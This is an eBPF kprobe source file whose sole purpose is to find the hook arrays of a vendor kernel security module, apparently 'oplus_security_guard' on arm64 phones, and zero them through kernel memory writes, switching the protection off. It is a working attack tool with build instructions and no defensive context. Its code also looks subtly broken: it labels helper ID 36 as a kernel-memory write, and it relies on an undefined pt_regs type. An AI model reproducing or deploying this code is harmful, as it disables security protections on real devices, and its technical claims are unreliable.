/* SPDX-License-Identifier: GPL-2.0 */
/*
 * unhook.bpf.c — eBPF kprobe: zero oplus_security_guard hook arrays
 *
 * Build: clang -target bpf -O2 -g -c unhook.bpf.c -o unhook.bpf.o
 *        (uses -target bpf builtins, no external headers needed)
 */

/* ── Minimal BPF types and macros (no external headers) ────────── */
typedef unsigned char  __u8;
typedef unsigned int   __u32;
typedef unsigned long long __u64;

#define SEC(name) __attribute__((section(name), used))
#define __always_inline inline __attribute__((always_inline))

/* BPF helper function IDs */
#define BPF_FUNC_map_lookup_elem   1
#define BPF_FUNC_probe_write_kernel 36

/* BPF map types (for ELF section) */
enum bpf_map_type { BPF_MAP_TYPE_ARRAY = 2 };

/* ── BPF builtin helper declarations ───────────────────────────── */

/* bpf_map_lookup_elem: returns pointer to value or NULL */
static void *(*bpf_map_lookup_elem)(void *map, const void *key)
    = (void *)BPF_FUNC_map_lookup_elem;

/* bpf_probe_write_kernel: write to kernel memory, returns 0 on success */
static long (*probe_write_kernel)(void *dst, const void *src, __u32 len)
    = (void *)BPF_FUNC_probe_write_kernel;

/* ── License ───────────────────────────────────────────────────── */
char _license[] SEC("license") = "GPL";

/* ── Configuration map ───────────────────────────────────────────
 * key=0: pre_hook address,  key=1: pre_hook count
 * key=2: post_hook address, key=3: post_hook count
 */
struct {
    __u32 type;        /* BPF_MAP_TYPE_ARRAY */
    __u32 max_entries; /* 4 */
    __u32 key_size;    /* sizeof(__u32) */
    __u32 value_size;  /* sizeof(__u64) */
} config SEC(".maps") = {
    .type = BPF_MAP_TYPE_ARRAY,
    .max_entries = 4,
    .key_size = sizeof(__u32),
    .value_size = sizeof(__u64),
};

/* ── Kprobe handler ─────────────────────────────────────────────── */

SEC("kprobe/__arm64_sys_getpid")
int unhook_kprobe(struct pt_regs *ctx)
{
    __u64 zero = 0;
    __u32 key;
    __u64 *addr_ptr, *cnt_ptr;
    __u64 target_addr, count, i;

    /* Read pre_hook config */
    key = 0;
    addr_ptr = (__u64 *)bpf_map_lookup_elem(&config, &key);
    key = 1;
    cnt_ptr  = (__u64 *)bpf_map_lookup_elem(&config, &key);

    if (addr_ptr && cnt_ptr && *addr_ptr) {
        target_addr = *addr_ptr;
        count = *cnt_ptr;
        if (count > 64) count = 64;
        /* Zero function pointers: each hook entry = 16 bytes */
        for (i = 0; i < count; i++) {
            if (probe_write_kernel((void *)(target_addr + i * 16),
                                   &zero, sizeof(zero)) != 0)
                break;
        }
    }

    /* Read post_hook config */
    key = 2;
    addr_ptr = (__u64 *)bpf_map_lookup_elem(&config, &key);
    key = 3;
    cnt_ptr  = (__u64 *)bpf_map_lookup_elem(&config, &key);

    if (addr_ptr && cnt_ptr && *addr_ptr) {
        target_addr = *addr_ptr;
        count = *cnt_ptr;
        if (count > 64) count = 64;
        for (i = 0; i < count; i++) {
            if (probe_write_kernel((void *)(target_addr + i * 16),
                                   &zero, sizeof(zero)) != 0)
                break;
        }
    }

    return 0;
}
